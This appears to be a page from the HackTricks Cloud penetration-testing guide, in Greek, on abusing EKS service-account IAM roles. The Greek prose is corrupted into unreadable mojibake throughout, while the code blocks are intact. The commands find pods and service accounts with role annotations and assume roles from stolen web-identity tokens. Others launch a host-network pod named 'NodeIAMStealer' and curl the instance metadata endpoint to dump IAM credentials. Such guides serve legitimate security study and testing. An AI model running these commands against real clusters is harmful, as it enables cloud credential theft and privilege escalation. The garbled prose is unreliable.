3. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î¼Î¹Î± [ÏƒÏ‡Î­ÏƒÎ· ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï… IAM ÎºÎ±Î¹ Ï„Î·Ï‚ SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ (Î® Ï„Ï‰Î½ namespaces Ï€Î¿Ï… Î´Î¯Î½Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ ÏÏŒÎ»Î¿ ÏƒÎµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ SAs Ï„Î¿Ï… namespace). _Î— ÏƒÏ‡Î­ÏƒÎ· ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ ÎºÏ…ÏÎ¯Ï‰Ï‚ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï€Î±ÏÏŒÏ‡Î¿Ï… OIDC, Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… namespace ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î·Ï‚ SA_.
4. Î¤Î­Î»Î¿Ï‚, **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î¼Î¹Î± SA Î¼Îµ Î¼Î¹Î± ÏƒÎ·Î¼ÎµÎ¯Ï‰ÏƒÎ· Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ Ï„Î¿ ARN Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…**, ÎºÎ±Î¹ Ï„Î± pods Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Îµ Î±Ï…Ï„Î® Ï„Î· SA Î¸Î± Î­Ï‡Î¿Ï…Î½ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ token Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…**. Î¤Î¿ **token** ÎµÎ¯Î½Î±Î¹ **Î³ÏÎ±Î¼Î¼Î­Î½Î¿** Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Î¹ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ **`AWS_WEB_IDENTITY_TOKEN_FILE`** (Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î®: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Î“Î¹Î± Î½Î± **Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ aws Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ token** Î±Ï€ÏŒ Ï„Î¿ `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ: 

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Î©Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Î­Î½Î± K8s cluster, ÎµÎ»Î­Î³Î¾Ï„Îµ Î³Î¹Î± **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬** Î³Î¹Î± Î½Î± **ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÏ„Îµ ÏƒÎµ AWS**. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Î±Ï€Î»Î¬ **exec/create** Î­Î½Î± **pod** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ IAM **Ï€ÏÎ¿Î½Î¿Î¼Î¹Î±ÎºÎ¿ÏÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½** ÎºÎ±Î¹ ÎºÎ»Î­ÏˆÏ„Îµ Ï„Î¿ token.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± pod, ÎµÎ»Î­Î³Î¾Ï„Îµ Î³Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ ÏŒÏ€Ï‰Ï‚ **AWS\_ROLE\_ARN** ÎºÎ±Î¹ **AWS\_WEB\_IDENTITY\_TOKEN.**
{% endhint %}

{% hint style="danger" %}
ÎœÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ Î· **Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎµÎ¼Ï€Î¹ÏƒÏ„Î¿ÏƒÏÎ½Î·Ï‚ ÎµÎ½ÏŒÏ‚ ÏÏŒÎ»Î¿Ï…** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ **ÎºÎ±ÎºÏÏ‚ Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î·** ÎºÎ±Î¹ Î±Î½Ï„Î¯ Î½Î± Î´Î¯Î½ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· AssumeRole ÏƒÏ„Î¿Î½ Î±Î½Î±Î¼ÎµÎ½ÏŒÎ¼ÎµÎ½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚, Ï„Î·Î½ Î´Î¯Î½ÎµÎ¹ ÏƒÎµ **ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½**. Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î¼Î¹Î± Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î­Î½Î±Î½ ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿.

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ **Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Î’ÏÎµÎ¯Ï„Îµ Pods ÎºÎ±Î¹ SAs Î¼Îµ IAM Î¡ÏŒÎ»Î¿Ï…Ï‚ ÏƒÏ„Î¿ Cluster

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Î½Î± **ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± Î¼Îµ ÏŒÎ»Î± Ï„Î± pods ÎºÎ±Î¹ Ï„Î¹Ï‚ Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ sas** **Î±Î½Î±Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚** Î±Ï…Ï„Î® Ï„Î·Î½ **Î±Î½Î±Ï†Î¿ÏÎ¬**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Role

Î— Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Î±Ï†Î¿ÏÎ¿ÏÏƒÎµ Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ IAM Roles Î¼Îµ pods, Î±Î»Î»Î¬ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î­Î½Î± **Node Ï„Î¿Ï…** K8s cluster Î¸Î± ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± **Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cloud**. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ Node ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï€Î¹Î¸Î±Î½ÏŒ Î½Î± **Î­Ï‡ÎµÎ¹ Î­Î½Î±Î½ Î½Î­Î¿ IAM ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ** (_ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏŒÎ»Î± Ï„Î± nodes ÎµÎ½ÏŒÏ‚ K8s cluster Î¸Î± Î­Ï‡Î¿Ï…Î½ Ï„Î¿Î½ Î¯Î´Î¹Î¿ IAM ÏÏŒÎ»Î¿, Î¿Ï€ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ ÎºÎ¬Î¸Îµ node_).

Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Ï‰ÏƒÏ„ÏŒÏƒÎ¿ Î¼Î¹Î± ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ® Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ metadata endpoint Î±Ï€ÏŒ Ï„Î¿ node, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯ÏƒÏ„Îµ ÏƒÏ„Î¿ node (ssh session;) Î® Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î¿ Î¯Î´Î¹Î¿ Î´Î¯ÎºÏ„Ï…Î¿:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### ÎšÎ»Î­ÏˆÎµ Ï„Î¿ IAM Role Token

Î ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ Î­Ï‡Î¿Ï…Î¼Îµ ÏƒÏ…Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï€ÏÏ‚ Î½Î± **ÏƒÏ…Î½Î´Î­ÏƒÎ¿Ï…Î¼Îµ IAM Roles ÏƒÎµ Pods** Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï€ÏÏ‚ Î½Î± **Î´Î¹Î±Ï†ÏÎ³Î¿Ï…Î¼Îµ ÏƒÏ„Î¿Î½ Node Î³Î¹Î± Î½Î± ÎºÎ»Î­ÏˆÎ¿Ï…Î¼Îµ Ï„Î¿ IAM Role** Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÏ…Î½Î·Î¼Î¼Î­Î½Î¿ Î· Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Î½Î± **ÎºÎ»Î­ÏˆÎµÏ„Îµ** Ï„Î± Î½Î­Î± ÏƒÎºÎ»Î·ÏÎ¬ ÎºÎµÏÎ´Î¹ÏƒÎ¼Î­Î½Î± **Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± IAM role** ÏƒÎ±Ï‚:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
